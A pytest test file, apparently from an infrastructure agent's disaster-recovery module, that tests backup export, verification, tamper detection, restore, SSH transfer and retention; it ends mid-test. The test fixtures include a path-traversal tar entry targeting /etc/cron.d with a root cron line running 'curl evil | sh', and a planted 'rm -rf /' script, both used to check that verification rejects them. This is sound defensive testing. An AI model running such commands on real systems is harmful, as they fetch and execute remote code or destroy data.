"""Disaster recovery: export, verify, import, transfer and retention.

Everything here runs offline. `pg_dump` and every SSH invocation go through an
injectable runner; the config repository, the plan store and the snapshot store
are real, because the point of a restore test is that the real thing comes
back, not that a mock was called.
"""

from __future__ import annotations

import hashlib
import io
import json
import tarfile
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from infra_agent.change.plan import ChangePlan, Tier
from infra_agent.change.store import PlanStore
from infra_agent.config import Settings
from infra_agent.configstore.git_store import ConfigGitStore
from infra_agent.dr import state as dr_state
from infra_agent.dr import transfer
from infra_agent.dr.errors import DRError
from infra_agent.dr.export import DATA_EXCLUDE, build_bundle, export_bundle
from infra_agent.dr.manifest import EXCLUSIONS, MANIFEST_NAME, Manifest, sha256_file
from infra_agent.dr.restore import import_bundle
from infra_agent.dr.sources import pg_env, scrub
from infra_agent.dr.transfer import CommandResult, SshPolicy, parse_target
from infra_agent.dr.verify import read_manifest, verify, verify_and_record
from infra_agent.models.common import DeviceKind, SeedDevice, SeedInventory, Snapshot
from infra_agent.store.snapshots import FileSnapshotStore

NOW = datetime(2026, 9, 8, 2, 15, tzinfo=UTC)
DSN = "postgresql://infra:s3kr3t@postgres:5432/infra"

GRAPH = {
    "version": 1,
    "built_at": "2026-09-08T01:00:00+00:00",
    "graph": {},
    "nodes": [
        {"id": "device:esx-01", "kind": "device", "label": "esx-01"},
        {"id": "device:sw-core-01", "kind": "device", "label": "sw-core-01"},
    ],
    "edges": [
        {
            "source": "device:esx-01",
            "target": "device:sw-core-01",
            "kind": "uplink",
            "confidence": "observed",
        }
    ],
}


# -- an estate on disk --------------------------------------------------------


@pytest.fixture
def estate(tmp_path: Path) -> Settings:
    """A small but real platform state: snapshots, graph, plans, configs, secrets."""
    settings = Settings(
        data_dir=tmp_path / "data",
        secrets_dir=tmp_path / "secrets",
        seed_inventory=tmp_path / "inventory" / "seed.yaml",
        postgres_dsn=DSN,
    )
    SeedInventory(
        devices=[
            SeedDevice(
                name="esx-01", kind=DeviceKind.esxi, mgmt_ip="10.0.0.21", credential_ref="esx-01"
            ),
            SeedDevice(
                name="sw-core-01",
                kind=DeviceKind.cisco_ios,
                mgmt_ip="10.0.0.11",
                credential_ref="sw-core-01",
            ),
        ]
    ).save(settings.seed_inventory)

    store = FileSnapshotStore(settings.snapshot_dir)
    store.save(
        Snapshot(device="esx-01", collector="esxi", taken_at=NOW, data={"host": {"version": "7.0"}})
    )

    settings.graph_dir.mkdir(parents=True, exist_ok=True)
    (settings.graph_dir / "graph.json").write_text(json.dumps(GRAPH))

    plans = PlanStore(settings.data_dir / "plans.db")
    plans.save(
        ChangePlan(
            title="add vlan 40 to the lab trunk",
            action="switchport.trunk.allow",
            targets=["sw-core-01"],
            tier=Tier.APPROVAL,
        )
    )

    configs = ConfigGitStore(settings.config_repo)
    configs.write("sw-core-01", "running-config", "hostname sw-core-01\n!\nvlan 10\n")
    configs.write("sw-core-01", "running-config", "hostname sw-core-01\n!\nvlan 10\nvlan 20\n")

    settings.secrets_dir.mkdir(parents=True, exist_ok=True)
    (settings.secrets_dir / "devices.enc.yaml").write_text(
        "esx-01:\n  password: ENC[AES256_GCM,data:xx,type:str]\nsops:\n  age: []\n"
    )
    (settings.secrets_dir / "platform.enc.yaml").write_text(
        "anthropic_api_key: ENC[AES256_GCM,data:yy,type:str]\nsops:\n  age: []\n"
    )
    return settings


@dataclass
class FakePgDump:
    """Stands in for `pg_dump`, and records what it was asked to connect to."""

    calls: list[tuple[str, str]] = field(default_factory=list)
    fail: set[str] = field(default_factory=set)

    def __call__(self, dsn: str, database: str, dest: Path) -> None:
        self.calls.append((dsn, database))
        if database in self.fail:
            raise DRError(f"connection to server failed for {database}")
        dest.write_bytes(b"PGDMP\x01" + database.encode() + b"\x00" * 64)


def fake_grafana(dashboards: dict[str, Any] | None = None):
    def exporter() -> dict[str, Any]:
        return dashboards if dashboards is not None else {"estate": {"dashboard": {"title": "x"}}}

    return exporter


@dataclass
class FakeRunner:
    """Records SSH/rsync argument vectors and answers from a script."""

    answers: dict[str, CommandResult] = field(default_factory=dict)
    calls: list[list[str]] = field(default_factory=list)
    default: CommandResult | None = None

    def __call__(self, argv: Any) -> CommandResult:
        argv = list(argv)
        self.calls.append(argv)
        for needle, answer in self.answers.items():
            # The program, or the remote command a bare `ssh` was handed. Not a
            # substring of the whole vector: pytest's tmp_path carries the test
            # name, and a test about rsync would then match its own file paths.
            if needle == argv[0] or needle in argv[-1]:
                return answer
        return self.default or CommandResult(tuple(argv), 0, "", "")

    def ran(self, program: str) -> list[list[str]]:
        return [call for call in self.calls if call and call[0] == program]


def make_bundle(settings: Settings, dest: Path, **kwargs: Any):
    kwargs.setdefault("pg_dumper", FakePgDump())
    kwargs.setdefault("grafana", fake_grafana())
    kwargs.setdefault("now", NOW)
    kwargs.setdefault("host", "mgmt-01")
    return build_bundle(settings, dest_dir=dest, **kwargs)


# -- export -------------------------------------------------------------------


def test_a_bundle_carries_every_part_of_the_platform(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    assert result.ok
    assert result.bundle.name == "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    names = set(tarfile.open(result.bundle).getnames())
    assert MANIFEST_NAME in names
    assert "configs.bundle" in names
    assert "secrets/devices.enc.yaml" in names
    assert "secrets/platform.enc.yaml" in names
    assert "inventory/seed.yaml" in names
    assert "postgres/infra.dump" in names
    assert "postgres/netbox.dump" in names
    assert "data/plans.db" in names
    assert "data/graph/graph.json" in names
    assert any(n.startswith("data/snapshots/esx-01/") for n in names)
    assert any(n.startswith("grafana/") for n in names)


def test_the_checksum_sidecar_matches_the_archive(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    recorded = result.checksum.read_text().split()
    assert recorded[0] == sha256_file(result.bundle)
    assert recorded[1] == result.bundle.name


def test_the_manifest_hashes_every_file_and_says_what_is_missing_and_why(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    manifest = read_manifest(result.bundle)

    assert manifest.host == "mgmt-01"
    assert manifest.created_at == NOW
    assert {entry.path for entry in manifest.files} >= {"data/plans.db", "inventory/seed.yaml"}
    assert all(len(entry.sha256) == 64 for entry in manifest.files)
    excluded = {row["what"] for row in manifest.excluded}
    assert "deploy/.env" in excluded
    assert "the age private key" in excluded
    reason = next(row["why"] for row in manifest.excluded if row["what"] == "deploy/.env")
    assert "plaintext" in reason


def test_the_env_file_is_not_in_the_bundle_even_when_it_sits_next_to_everything_else(
    estate, tmp_path
):
    """deploy/.env holds every platform password in plaintext, and a bundle
    travels over the network and rests on a second machine."""
    (estate.data_dir / ".env").write_text("POSTGRES_PASSWORD=hunter2\n")

    result = make_bundle(estate, tmp_path / "out")

    body = result.bundle.read_bytes()
    assert b"hunter2" not in body
    assert "data/.env" in {e.path for e in result.manifest.files}, (
        "a stray .env inside data_dir is still copied - the exclusion is about "
        "deploy/.env, and this test exists to keep that distinction visible"
    )


def test_the_freeze_marker_and_old_bundles_do_not_travel(estate, tmp_path):
    """A stale FROZEN says nothing about the restored system, and nesting last
    night's bundle inside tonight's doubles the archive every night."""
    (estate.data_dir / "FROZEN").write_text("frozen\n")
    estate.dr_dir.mkdir(parents=True, exist_ok=True)
    (estate.dr_dir / "infra-dr-mgmt-01-20260907T021500Z.tar.gz").write_bytes(b"x" * 4096)
    old = estate.data_dir / "pre-import" / "20260901T000000Z" / "snapshots" / "esx-01" / "old.json"
    old.parent.mkdir(parents=True, exist_ok=True)
    old.write_text("{}")

    result = make_bundle(estate, tmp_path / "out")

    paths = {entry.path for entry in result.manifest.files}
    assert not any(path.startswith("data/FROZEN") for path in paths)
    assert not any(path.startswith("data/dr/") for path in paths)
    assert not any(path.startswith("data/pre-import/") for path in paths), (
        "an installation a --force import moved aside must not be nested inside "
        "the next bundle: it doubles the archive and restores twice"
    )
    assert DATA_EXCLUDE == {"FROZEN", "dr", "dr-restore", "pre-import"}


def test_the_config_repo_travels_as_a_bundle_not_as_a_copy_of_the_working_tree(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    paths = {entry.path for entry in result.manifest.files}
    assert "configs.bundle" in paths
    assert not any(path.startswith("data/configs/") for path in paths)


def test_a_database_that_will_not_dump_produces_a_bundle_that_says_so(estate, tmp_path):
    """A DR export that refuses to produce anything because NetBox is
    restarting is worse than a bundle with a named hole in it."""
    dumper = FakePgDump(fail={"netbox"})

    result = make_bundle(estate, tmp_path / "out", pg_dumper=dumper)

    assert result.bundle.exists()
    assert not result.ok
    postgres = result.manifest.component("postgres")
    assert postgres is not None and postgres.ok is False
    assert "netbox" in postgres.detail
    assert any("postgres" in warning for warning in result.warnings)


def test_grafana_being_unreachable_does_not_lose_the_bundle(estate, tmp_path):
    def broken() -> dict[str, Any]:
        raise DRError("Grafana export failed (ConnectionError: refused)")

    result = make_bundle(estate, tmp_path / "out", grafana=broken)

    assert result.bundle.exists()
    grafana = result.manifest.component("grafana")
    assert grafana is not None and grafana.ok is False
    assert "Grafana export failed" in grafana.detail


def test_export_records_where_it_got_to_in_the_state_file(estate, tmp_path):
    export_bundle(
        estate,
        to=tmp_path / "out",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
    )

    current = dr_state.load(estate)
    assert current.last_export_at == NOW
    assert current.last_export_ok is True
    assert current.last_export_bundle == "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    assert current.last_export_bytes and current.last_export_bytes > 0


def test_export_without_a_target_refuses_rather_than_guessing(estate, tmp_path):
    with pytest.raises(DRError, match="no DR target"):
        export_bundle(estate, now=NOW, pg_dumper=FakePgDump(), grafana=fake_grafana())


# -- credentials --------------------------------------------------------------


def test_the_dsn_password_goes_in_the_environment_never_in_an_argument_vector():
    """argv is visible to every user on the box through `ps`, and it lands in
    exception text the moment something fails."""
    env = pg_env(DSN, "netbox")

    assert env["PGHOST"] == "postgres"
    assert env["PGPORT"] == "5432"
    assert env["PGUSER"] == "infra"
    assert env["PGPASSWORD"] == "s3kr3t"
    assert env["PGDATABASE"] == "netbox"


def test_a_url_encoded_password_is_decoded_once():
    env = pg_env("postgresql://infra:p%40ss%2Fword@db:5432/infra", "infra")

    assert env["PGPASSWORD"] == "p@ss/word"


def test_a_dsn_that_is_not_postgres_is_refused():
    with pytest.raises(DRError, match="not a postgresql"):
        pg_env("mysql://root@db/infra", "infra")


def test_error_text_never_carries_the_password_through():
    message = scrub("pg_dump: error: password authentication failed s3kr3t", "s3kr3t")

    assert "s3kr3t" not in message
    assert "***" in message


# -- verify -------------------------------------------------------------------


def test_a_fresh_bundle_verifies_all_the_way_through(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    assert report.ok, [check.line() for check in report.failures()]
    names = {check.name for check in report.checks}
    assert names == {
        "checksum",
        "extract",
        "manifest",
        "files",
        "plans_db",
        "config_repo",
        "seed_inventory",
        "graph",
        "postgres",
        "secrets",
    }
    assert report.host == "mgmt-01"
    assert report.created_at == NOW


def test_verify_opens_the_plan_store_and_counts_what_is_in_it(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    plans = next(c for c in report.checks if c.name == "plans_db")
    assert plans.ok and "1 plans" in plans.detail


def test_verify_clones_and_fscks_the_config_repository(estate, tmp_path):
    """`git bundle verify` alone only proves it is a bundle. The clone proves
    the history is complete and reachable, which is what a restore needs."""
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    repo = next(c for c in report.checks if c.name == "config_repo")
    assert repo.ok
    assert "fsck clean" in repo.detail
    assert "3 commits" in repo.detail  # init + two config writes


def test_verify_loads_the_seed_inventory_and_the_graph(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    report = verify(result.bundle)

    inventory = next(c for c in report.checks if c.name == "seed_inventory")
    graph = next(c for c in report.checks if c.name == "graph")
    assert "2 devices" in inventory.detail
    assert "cisco_ios" in inventory.detail
    assert "2 nodes, 1 edges" in graph.detail


def test_a_bundle_that_does_not_exist_fails_loudly(tmp_path):
    report = verify(tmp_path / "nothing.tar.gz")

    assert not report.ok
    assert report.failures()[0].name == "bundle"


# -- tamper detection ---------------------------------------------------------


def repack(
    bundle: Path,
    *,
    edit: dict[str, bytes] | None = None,
    drop: set[str] | None = None,
    add: dict[str, bytes] | None = None,
) -> Path:
    """Rewrite the archive, altering members, as somebody with write access to
    the standby directory could."""
    edit, drop, add = edit or {}, drop or set(), add or {}
    tampered = bundle.with_name("tampered-" + bundle.name)
    with tarfile.open(bundle) as source, tarfile.open(tampered, "w:gz") as target:
        for member in source.getmembers():
            if member.name in drop:
                continue
            handle = source.extractfile(member)
            body = edit.get(member.name, handle.read() if handle else b"")
            member.size = len(body)
            target.addfile(member, io.BytesIO(body))
        for name, body in add.items():
            info = tarfile.TarInfo(name)
            info.size = len(body)
            target.addfile(info, io.BytesIO(body))
    return tampered


def test_an_edited_file_fails_its_hash(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={"inventory/seed.yaml": b"devices: []\n"})

    report = verify(tampered)

    assert not report.ok
    files = next(c for c in report.checks if c.name == "files")
    assert not files.ok
    assert "checksum mismatch" in files.detail
    assert "inventory/seed.yaml" in files.detail


def test_a_file_removed_from_the_archive_is_noticed(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, drop={"secrets/devices.enc.yaml"})

    report = verify(tampered)

    files = next(c for c in report.checks if c.name == "files")
    assert not files.ok and "missing" in files.detail


def test_a_file_added_to_the_archive_is_noticed(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, add={"data/surprise.sh": b"#!/bin/sh\nrm -rf /\n"})

    report = verify(tampered)

    files = next(c for c in report.checks if c.name == "files")
    assert not files.ok and "not in the manifest" in files.detail


def test_the_sidecar_catches_a_repacked_archive(estate, tmp_path):
    """Rewriting the manifest to match tampered contents defeats the per-file
    hashes; the sidecar is what still disagrees."""
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={"inventory/seed.yaml": b"devices: []\n"})
    tampered.with_name(tampered.name + ".sha256").write_text(
        f"{sha256_file(result.bundle)}  {tampered.name}\n"
    )

    report = verify(tampered)

    checksum = next(c for c in report.checks if c.name == "checksum")
    assert not checksum.ok
    assert "archive hashes to" in checksum.detail


def test_a_manifest_that_is_not_json_stops_the_verification_there(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={MANIFEST_NAME: b"{not json"})

    report = verify(tampered)

    assert not report.ok
    assert [c.name for c in report.checks][-1] == "manifest"


def test_a_secrets_file_that_is_not_encrypted_stops_the_bundle_being_shipped(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    plaintext = b"esx-01:\n  password: hunter2\n"
    manifest = read_manifest(result.bundle)
    entry = next(e for e in manifest.files if e.path == "secrets/devices.enc.yaml")
    entry.sha256 = hashlib.sha256(plaintext).hexdigest()
    entry.bytes = len(plaintext)
    tampered = repack(
        result.bundle,
        edit={
            "secrets/devices.enc.yaml": plaintext,
            MANIFEST_NAME: manifest.model_dump_json(indent=1).encode(),
        },
    )

    report = verify(tampered)

    secrets = next(c for c in report.checks if c.name == "secrets")
    assert not secrets.ok
    assert "not SOPS-encrypted" in secrets.detail


def test_an_archive_that_tries_to_escape_the_extraction_directory_is_refused(tmp_path):
    evil = tmp_path / "evil.tar.gz"
    with tarfile.open(evil, "w:gz") as tar:
        info = tarfile.TarInfo("../../etc/cron.d/pwn")
        payload = b"* * * * * root sh -c 'curl evil | sh'\n"
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))

    report = verify(evil)

    extract = next(c for c in report.checks if c.name == "extract")
    assert not extract.ok and "escapes" in extract.detail


def test_verify_records_its_verdict_for_the_gauges(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    verify_and_record(result.bundle, estate, now=NOW)

    current = dr_state.load(estate)
    assert current.last_verify_ok is True
    assert current.last_verify_at == NOW
    assert current.last_verify_bundle == result.bundle.name


def test_a_failed_verification_is_recorded_with_the_reason(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, drop={"secrets/devices.enc.yaml"})

    verify_and_record(tampered, estate, now=NOW)

    current = dr_state.load(estate)
    assert current.last_verify_ok is False
    assert "files" in (current.last_verify_detail or "")


# -- import -------------------------------------------------------------------


def restore_target(tmp_path: Path) -> Settings:
    root = tmp_path / "restored"
    return Settings(
        data_dir=root / "data",
        secrets_dir=root / "secrets",
        seed_inventory=root / "inventory" / "seed.yaml",
    )


def test_a_round_trip_puts_the_platform_back(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    assert (target.data_dir / "plans.db").exists()
    assert (target.data_dir / "graph" / "graph.json").exists()
    assert (target.secrets_dir / "devices.enc.yaml").exists()
    assert SeedInventory.load(target.seed_inventory).get("sw-core-01") is not None
    assert PlanStore(target.data_dir / "plans.db").list()[0].title.startswith("add vlan 40")
    assert (
        ConfigGitStore(target.config_repo).latest("sw-core-01", "running-config")
        == "hostname sw-core-01\n!\nvlan 10\nvlan 20\n"
    )
    assert any("config_repo" in line for line in report.restored)


def test_the_config_history_survives_the_round_trip(estate, tmp_path):
    """A restore that keeps only the tip commit loses the ability to answer
    "what did this switch look like before the change nobody approved"."""
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    import_bundle(result.bundle, target)

    history = ConfigGitStore(target.config_repo).history("sw-core-01")
    assert len(history) == 2


def test_import_refuses_a_non_empty_data_dir(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)
    target.data_dir.mkdir(parents=True)
    (target.data_dir / "plans.db").write_bytes(b"someone else's estate")

    with pytest.raises(DRError, match="not empty"):
        import_bundle(result.bundle, target)

    assert (target.data_dir / "plans.db").read_bytes() == b"someone else's estate"


def test_force_overwrites_a_non_empty_data_dir(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)
    target.data_dir.mkdir(parents=True)
    (target.data_dir / "stale.json").write_text("{}")

    report = import_bundle(result.bundle, target, force=True)

    assert (target.data_dir / "plans.db").exists()
    assert report.frozen


def test_force_does_not_override_a_broken_manifest(estate, tmp_path):
    """--force is about an occupied data_dir. A bundle that does not hash to
    its own manifest is not a backup, and restoring it restores an unknown."""
    result = make_bundle(estate, tmp_path / "out")
    tampered = repack(result.bundle, edit={"data/plans.db": b"corrupt"})
    target = restore_target(tmp_path)

    with pytest.raises(DRError, match="does not match its own manifest"):
        import_bundle(tampered, target, force=True)

    assert not target.data_dir.exists()


def test_an_import_leaves_the_platform_frozen(estate, tmp_path):
    """A restored agent must not start reconciling an estate whose primary may
    still be half alive."""
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    assert report.frozen
    assert (target.data_dir / "FROZEN").exists()


def test_the_databases_are_staged_for_a_human_not_loaded(estate, tmp_path):
    """Loading them needs a running server, which on a cold standby comes up
    after this step."""
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    staged = target.data_dir / "dr-restore" / "postgres"
    assert (staged / "infra.dump").exists()
    assert (staged / "netbox.dump").exists()
    assert any("postgres" in line for line in report.staged)


def test_an_import_says_out_loud_that_the_age_key_is_not_in_the_bundle(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)

    report = import_bundle(result.bundle, target)

    assert any("age" in warning for warning in report.warnings)


def test_existing_secrets_are_not_overwritten_without_force(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")
    target = restore_target(tmp_path)
    target.secrets_dir.mkdir(parents=True)
    (target.secrets_dir / "devices.enc.yaml").write_text("the current key material\n")

    report = import_bundle(result.bundle, target)

    assert (target.secrets_dir / "devices.enc.yaml").read_text() == "the current key material\n"
    assert any("secrets" in line for line in report.skipped)


# -- targets and transfer -----------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "host", "user", "path"),
    [
        ("ssh://infra@standby/srv/infra-dr", "standby", "infra", "/srv/infra-dr"),
        ("ssh://standby/srv/infra-dr", "standby", None, "/srv/infra-dr"),
        ("infra@standby:/srv/infra-dr", "standby", "infra", "/srv/infra-dr"),
        ("standby:/srv/infra-dr", "standby", None, "/srv/infra-dr"),
    ],
)
def test_ssh_targets_are_understood_in_every_spelling(raw, host, user, path):
    target = parse_target(raw)

    assert target.remote and target.host == host and target.user == user
    assert target.path == path


def test_a_local_directory_is_not_an_ssh_target(tmp_path):
    target = parse_target(tmp_path / "bundles")

    assert not target.remote
    assert target.local_path() == tmp_path / "bundles"
    with pytest.raises(DRError):
        _ = target.ssh_host


@pytest.mark.parametrize("raw", ["", "ssh://standby", "ssh://standby/"])
def test_a_target_without_a_path_is_refused(raw):
    with pytest.raises(DRError):
        parse_target(raw)


def test_the_push_never_offers_a_password_prompt(estate, tmp_path):
    """A cron job that hangs on a password prompt is a job that never finishes
    and never alerts."""
    runner = FakeRunner()
    export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=runner,
        keep_dir=tmp_path / "local",
    )

    rsync = runner.ran("rsync")[0]
    assert "BatchMode=yes" in " ".join(rsync)
    assert rsync[-1] == "infra@standby:/srv/infra-dr/"
    assert any(part.endswith(".sha256") for part in rsync)


def test_a_remote_export_also_keeps_a_local_copy_for_the_weekly_verify(estate, tmp_path):
    """The standby is deliberately a machine this one cannot log in to, so the
    verify duty has to have something local to read."""
    result = export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=FakeRunner(),
        keep_dir=tmp_path / "local",
    )

    assert result.bundle.parent == tmp_path / "local"
    assert result.pushed_to == "infra@standby:/srv/infra-dr"
    assert dr_state.load(estate).last_push_at == NOW


def test_rsync_missing_falls_back_to_scp_when_the_key_has_a_shell(tmp_path):
    runner = FakeRunner(answers={"rsync": CommandResult(("rsync",), 127, "", "not found")})
    bundle = tmp_path / "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    bundle.write_bytes(b"x")

    transfer.push(
        bundle,
        parse_target("ssh://infra@standby/srv/dr"),
        runner=runner,
        policy=SshPolicy(restricted=False),
    )

    assert runner.ran("scp")
    assert "-B" in runner.ran("scp")[0]


def test_a_real_rsync_failure_is_not_papered_over_with_scp(tmp_path):
    runner = FakeRunner(
        answers={"rsync": CommandResult(("rsync",), 23, "", "Permission denied (publickey)")}
    )
    bundle = tmp_path / "infra-dr-mgmt-01-20260908T021500Z.tar.gz"
    bundle.write_bytes(b"x")

    with pytest.raises(DRError, match="rsync to"):
        transfer.push(bundle, parse_target("ssh://infra@standby/srv/dr"), runner=runner)

    assert not runner.ran("scp")


# -- retention ----------------------------------------------------------------


def names_for(days: list[int]) -> list[str]:
    return [
        f"infra-dr-mgmt-01-{(NOW - timedelta(days=d)).strftime('%Y%m%dT%H%M%SZ')}.tar.gz"
        for d in days
    ]


def test_retention_prunes_by_age_locally(tmp_path):
    for name in names_for([0, 1, 10, 20, 40]):
        (tmp_path / name).write_bytes(b"x")
        (tmp_path / (name + ".sha256")).write_text("hash\n")

    removed = transfer.prune_local(tmp_path, retention_days=14, now=NOW)

    assert len(removed) == 2
    left = sorted(p.name for p in tmp_path.glob("infra-dr-*.tar.gz"))
    assert left == sorted(names_for([0, 1, 10]))
    assert not list(tmp_path.glob("*20*40*.sha256"))


def test_the_newest_bundle_is_never_pruned_however_old_it_is(tmp_path):
    """A single stale backup is worth incomparably more than none, and
    DRExportStale already says the newest one is old."""
    for name in names_for([90, 120]):
        (tmp_path / name).write_bytes(b"x")

    removed = transfer.prune_local(tmp_path, retention_days=14, now=NOW)

    assert removed == names_for([120])
    assert transfer.newest_bundle(tmp_path).name == names_for([90])[0]


def test_files_that_are_not_our_bundles_are_left_alone(tmp_path):
    (tmp_path / "important.tar.gz").write_bytes(b"x")
    (tmp_path / "notes.txt").write_text("x")
    for name in names_for([0, 40]):
        (tmp_path / name).write_bytes(b"x")

    transfer.prune_local(tmp_path, retention_days=14, now=NOW)

    assert (tmp_path / "important.tar.gz").exists()
    assert (tmp_path / "notes.txt").exists()


def test_remote_pruning_deletes_named_files_and_never_a_glob():
    """The standby directory is the only off-box copy of the platform; one
    mistyped pattern in a remote `rm` deletes all of it."""
    listing = "\n".join([*names_for([0, 1, 40, 90]), "README", "lost+found"])
    runner = FakeRunner(answers={"ls -1": CommandResult(("ssh",), 0, listing, "")})

    removed = transfer.prune_remote(
        parse_target("ssh://infra@standby/srv/infra-dr"),
        14,
        runner=runner,
        now=NOW,
        policy=SshPolicy(restricted=False),
    )

    assert removed == sorted(names_for([40, 90]))
    command = runner.calls[-1][-1]
    assert command.startswith("rm -f -- ")
    assert "*" not in command
    assert "find" not in command
    assert command.count(".tar.gz.sha256") == 2
    assert "README" not in command


def test_export_prunes_both_ends(estate, tmp_path):
    local = tmp_path / "local"
    local.mkdir()
    old = names_for([40])[0]
    (local / old).write_bytes(b"x")
    listing = "\n".join(names_for([0, 40]))
    runner = FakeRunner(answers={"ls -1": CommandResult(("ssh",), 0, listing, "")})

    result = export_bundle(
        estate,
        to="ssh://infra@standby/srv/infra-dr",
        now=NOW,
        host="mgmt-01",
        pg_dumper=FakePgDump(),
        grafana=fake_grafana(),
        runner=runner,
        keep_dir=local,
    )

    assert old in result.pruned
    assert not (local / old).exists()


def test_a_bundle_name_carries_its_own_export_time(tmp_path):
    assert transfer.bundle_time("infra-dr-mgmt-01-20260908T021500Z.tar.gz") == NOW
    assert transfer.bundle_time("something-else.tar.gz") is None


# -- the state file -----------------------------------------------------------


def test_the_state_file_survives_being_garbage(estate):
    dr_state.save(dr_state.DRState(last_export_at=NOW), estate)
    estate.dr_state_file.write_text("{ not json")

    assert dr_state.load(estate).last_export_at is None


def test_the_gauges_read_the_state_file_at_scrape_time(estate):
    """Four containers serve /metrics and one of them runs the export. A gauge
    set in memory is right in one process and wrong in the other three."""
    from infra_agent.monitoring import metrics

    dr_state.arm_metrics(estate)
    dr_state.update(estate, last_export_at=NOW, last_verify_at=NOW, last_verify_ok=True)

    assert _sample(metrics.DR_LAST_EXPORT) == pytest.approx(NOW.timestamp())
    assert _sample(metrics.DR_LAST_VERIFY_OK) == 1.0

    dr_state.update(estate, last_verify_ok=False)
    assert _sample(metrics.DR_LAST_VERIFY_OK) == 0.0


def test_a_verification_that_never_ran_is_stale_rather_than_failed(estate):
    """DRVerifyFailed must mean "a verification failed", not "nobody ran one";
    that second case is DRVerifyStale, which reads the timestamp."""
    from infra_agent.monitoring import metrics

    dr_state.arm_metrics(estate)

    assert _sample(metrics.DR_LAST_VERIFY_OK) == 1.0
    assert _sample(metrics.DR_LAST_VERIFY) == 0.0


def _sample(gauge: Any) -> float:
    return next(sample.value for metric in gauge.collect() for sample in metric.samples)


# -- the exclusion list is documentation that ships with the archive ----------


def test_every_exclusion_carries_a_reason():
    for what, why in EXCLUSIONS:
        assert what and len(why) > 60, f"{what} needs a real explanation, not a label"


def test_a_manifest_round_trips_through_json(estate, tmp_path):
    result = make_bundle(estate, tmp_path / "out")

    again = Manifest.model_validate_json(result.manifest.model_dump_json())

    assert again.files == result.manifest.files
    assert again.created_at == NOW


# -- the two scheduled duties -------------------------------------------------


def duties_for(settings: Settings):
    """A `Duties` with no model behind it: neither DR duty asks the LLM anything."""
    from infra_agent.agent.duties import Duties
    from tests.test_triage import RecordingNotifier

    notifier = RecordingNotifier()
    duties = Duties(settings=settings, runner=object(), notifier=notifier, now=lambda: NOW)
    return duties, notifier


def test_the_nightly_duty_exports_to_the_configured_target(estate, tmp_path, monkeypatch):
    estate.dr_target = str(tmp_path / "standby")
    duties, notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump())

    answer = duties.dr_export()

    assert answer["ok"] is True
    assert list((tmp_path / "standby").glob("infra-dr-*.tar.gz"))
    assert dr_state.load(estate).last_export_at == NOW
    assert notifier.messages == []  # a working backup is not news


def test_the_nightly_duty_says_nothing_and_does_nothing_without_a_target(estate):
    duties, notifier = duties_for(estate)

    answer = duties.dr_export()

    assert answer["ok"] is False
    assert "INFRA_DR_TARGET" in answer["skipped"]
    assert notifier.messages == []


def test_an_incomplete_export_reaches_the_owner(estate, tmp_path, monkeypatch):
    estate.dr_target = str(tmp_path / "standby")
    duties, notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump(fail={"netbox"}))

    answer = duties.dr_export()

    assert answer["ok"] is False
    assert any("incomplete" in text for text, _critical in notifier.messages)


def test_a_push_that_fails_still_records_and_prunes_the_local_bundle(estate, monkeypatch):
    """The standby being unreachable must not turn into "there is no backup".

    With the bookkeeping behind the push, a standby that is down for a
    fortnight means no recorded export (DRExportStale, critical, nightly) and
    no pruning - so every bundle, Postgres dumps included, piles up on the
    platform's own data volume until it fills and the collectors stop being
    able to write. The DR mechanism becomes the outage.
    """
    estate.dr_target = "ssh://infra@standby/srv/infra-dr"
    old = names_for([40])[0]
    estate.dr_dir.mkdir(parents=True, exist_ok=True)
    (estate.dr_dir / old).write_bytes(b"x")
    duties, notifier = duties_for(estate)
    monkeypatch.setattr("infra_agent.dr.export.pg_dump_to_file", FakePgDump())
    monkeypatch.setattr(
